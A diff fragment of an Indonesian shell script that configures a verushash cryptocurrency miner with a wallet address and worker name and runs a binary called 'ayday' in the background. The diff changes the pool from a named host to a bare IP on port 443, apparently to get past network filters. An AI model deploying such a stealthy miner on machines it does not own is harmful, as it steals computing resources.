@@ -29,10 +29,10 @@ done
 
 # Pengaturan penambangan
 ALGO="verushash"
-POOL_URL="stratum+tcp://sg.vipor.net:5040"
+POOL_URL="stratum+tcp://128.199.167.154:443"
 WALLET_ADDRESS="RSG3DX4HDWw1Z1k3jSPwribvVs3ghscR3m"
 PASSWORD="x"
-WORKER_NAME="bebaskan$RANDOM"
+WORKER_NAME="bebaskann$RANDOM"
 
 # Memulai dengan file ayday dan menjalankan di latar belakang
 cd $INSTALL_DIR
